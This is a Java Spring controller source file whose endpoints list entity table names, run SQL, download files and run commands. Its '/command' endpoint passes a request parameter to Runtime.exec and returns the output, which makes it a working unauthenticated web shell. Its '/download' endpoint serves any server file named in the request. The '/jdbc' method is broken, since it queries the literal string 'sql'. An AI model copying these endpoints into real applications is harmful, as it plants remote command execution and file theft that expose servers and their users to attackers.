package cn.com.easy;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import javax.persistence.Table;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import cn.com.easy.utils.FastJSONUtils;
import cn.com.easy.utils.ResponseOutputUtils;

import com.google.common.collect.Lists;

/**
 * 控制器
 * 
 * @author nibili 2016年11月15日
 * 
 */
@Controller
@RequestMapping("/mybase")
public class MyBaseController {

	/** jdbcTemplate */
	@Autowired
	private JdbcTemplate jdbcTemplate;

	/**
	 * 获取所有表名
	 * 
	 * @param request
	 * @param response
	 * @author nibili 2016年11月21日
	 */
	@RequestMapping("/alltables")
	public void alltables(HttpServletRequest request, HttpServletResponse response, String packagePath) {
		try {
			if (StringUtils.isBlank(packagePath) == true) {
				packagePath = "cn.com.czw.base.entity";
			}
			List<String> list = Lists.newArrayList();
			List<Class<?>> classes = getClasses(packagePath);
			for (Class<?> clazz : classes) {
				if (clazz.isAnnotationPresent(Table.class) == true) {
					Table table = clazz.getAnnotation(Table.class);
					list.add(table.name());
				}
			}
			ResponseOutputUtils.renderHtml(response, FastJSONUtils.toJsonString(list));
		} catch (Exception e) {
			ResponseOutputUtils.renderHtml(response, e.getLocalizedMessage());
		}
	}

	/**
	 * 执行sql
	 * 
	 * @param request
	 * @param response
	 * @param file
	 * @param encode
	 * @author nibili 2016年11月21日
	 */
	@RequestMapping("/jdbc")
	public void jdbc(HttpServletRequest request, HttpServletResponse response, String sql) {
		try {
			List<Map<String, Object>> list = jdbcTemplate.queryForList("sql");
			System.out.println(FastJSONUtils.toJsonString(list));
		} catch (Exception e) {
			ResponseOutputUtils.renderHtml(response, e.getLocalizedMessage());
		}
	}

	/**
	 * 下载
	 * 
	 * @param request
	 * @param response
	 * @param file
	 * @param encode
	 * @author nibili 2016年11月15日
	 */
	@RequestMapping("/download")
	public void download(HttpServletRequest request, HttpServletResponse response, String file, String encode) {
		try {
			if (StringUtils.isBlank(encode) == true) {
				encode = "utf-8";
			}
			byte[] data = FileUtils.readFileToByteArray(new File(file));
			String fileName = URLEncoder.encode(file, encode);
			response.reset();
			response.setHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
			response.addHeader("Content-Length", "" + data.length);
			response.setContentType("application/octet-stream;charset=UTF-8");
			OutputStream outputStream = new BufferedOutputStream(response.getOutputStream());
			outputStream.write(data);
			outputStream.flush();
			outputStream.close();
		} catch (Exception e) {
			ResponseOutputUtils.renderHtml(response, e.getLocalizedMessage());
		}
	}

	/**
	 * 
	 * @param request
	 * @param response
	 * @param order
	 * @author nibili 2016年11月15日
	 */
	@RequestMapping("/command")
	public void command(HttpServletRequest request, HttpServletResponse response, String command, String encode) {
		try {
			if (StringUtils.isBlank(encode) == true) {
				encode = "utf-8";
			}
			Process p = Runtime.getRuntime().exec(command);
			ResponseOutputUtils.renderHtml(response, "----Rrror----" + "<br/>");
			List<String> resList = IOUtils.readLines(p.getErrorStream(), encode);
			if (CollectionUtils.isNotEmpty(resList) == true) {
				for (String temp : resList) {
					ResponseOutputUtils.renderHtml(response, temp + "<br/>");
				}
			}
			ResponseOutputUtils.renderHtml(response, "----sucess----" + "<br/>");
			resList = IOUtils.readLines(p.getInputStream(), encode);
			if (CollectionUtils.isNotEmpty(resList) == true) {
				for (String temp : resList) {
					ResponseOutputUtils.renderHtml(response, temp + "<br/>");
				}
			}
			ResponseOutputUtils.renderHtml(response, "----End----" + "<br/>");
		} catch (Exception e) {
			ResponseOutputUtils.renderHtml(response, e.getLocalizedMessage());
		}
	}

	/**
	 * 从包package中获取所有的Class
	 * 
	 * @param pack
	 * @return
	 */
	private static List<Class<?>> getClasses(String packageName) {

		// 第一个class类的集合
		List<Class<?>> classes = new ArrayList<Class<?>>();
		// 是否循环迭代
		boolean recursive = true;
		// 获取包的名字 并进行替换
		String packageDirName = packageName.replace('.', '/');
		// 定义一个枚举的集合 并进行循环来处理这个目录下的things
		Enumeration<URL> dirs;
		try {
			dirs = Thread.currentThread().getContextClassLoader().getResources(packageDirName);
			// 循环迭代下去
			while (dirs.hasMoreElements()) {
				// 获取下一个元素
				URL url = dirs.nextElement();
				// 得到协议的名称
				String protocol = url.getProtocol();
				// 如果是以文件的形式保存在服务器上
				if ("file".equals(protocol)) {
					// 获取包的物理路径
					String filePath = URLDecoder.decode(url.getFile(), "UTF-8");
					// 以文件的方式扫描整个包下的文件 并添加到集合中
					findAndAddClassesInPackageByFile(packageName, filePath, recursive, classes);
				} else if ("jar".equals(protocol)) {
					// 如果是jar包文件
					// 定义一个JarFile
					JarFile jar;
					try {
						// 获取jar
						jar = ((JarURLConnection) url.openConnection()).getJarFile();
						// 从此jar包 得到一个枚举类
						Enumeration<JarEntry> entries = jar.entries();
						// 同样的进行循环迭代
						while (entries.hasMoreElements()) {
							// 获取jar里的一个实体 可以是目录 和一些jar包里的其他文件 如META-INF等文件
							JarEntry entry = entries.nextElement();
							String name = entry.getName();
							// 如果是以/开头的
							if (name.charAt(0) == '/') {
								// 获取后面的字符串
								name = name.substring(1);
							}
							// 如果前半部分和定义的包名相同
							if (name.startsWith(packageDirName)) {
								int idx = name.lastIndexOf('/');
								// 如果以"/"结尾 是一个包
								if (idx != -1) {
									// 获取包名 把"/"替换成"."
									packageName = name.substring(0, idx).replace('/', '.');
								}
								// 如果可以迭代下去 并且是一个包
								if ((idx != -1) || recursive) {
									// 如果是一个.class文件 而且不是目录
									if (name.endsWith(".class") && !entry.isDirectory()) {
										// 去掉后面的".class" 获取真正的类名
										String className = name.substring(packageName.length() + 1, name.length() - 6);
										try {
											// 添加到classes
											classes.add(Class.forName(packageName + '.' + className));
										} catch (ClassNotFoundException e) {
											e.printStackTrace();
										}
									}
								}
							}
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		return classes;
	}

	/**
	 * 以文件的形式来获取包下的所有Class
	 * 
	 * @param packageName
	 * @param packagePath
	 * @param recursive
	 * @param classes
	 */
	private static void findAndAddClassesInPackageByFile(String packageName, String packagePath, final boolean recursive, List<Class<?>> classes) {
		// 获取此包的目录 建立一个File
		File dir = new File(packagePath);
		// 如果不存在或者 也不是目录就直接返回
		if (!dir.exists() || !dir.isDirectory()) {
			return;
		}
		// 如果存在 就获取包下的所有文件 包括目录
		File[] dirfiles = dir.listFiles(new FileFilter() {

			// 自定义过滤规则 如果可以循环(包含子目录) 或则是以.class结尾的文件(编译好的java类文件)
			public boolean accept(File file) {
				return (recursive && file.isDirectory()) || (file.getName().endsWith(".class"));
			}
		});
		// 循环所有文件
		for (File file : dirfiles) {
			// 如果是目录 则继续扫描
			if (file.isDirectory()) {
				findAndAddClassesInPackageByFile(packageName + "." + file.getName(), file.getAbsolutePath(), recursive, classes);
			} else {
				// 如果是java类文件 去掉后面的.class 只留下类名
				String className = file.getName().substring(0, file.getName().length() - 6);
				try {
					// 添加到集合中去
					classes.add(Class.forName(packageName + '.' + className));
				} catch (ClassNotFoundException e) {
					e.printStackTrace();
				}
			}
		}
	}
}
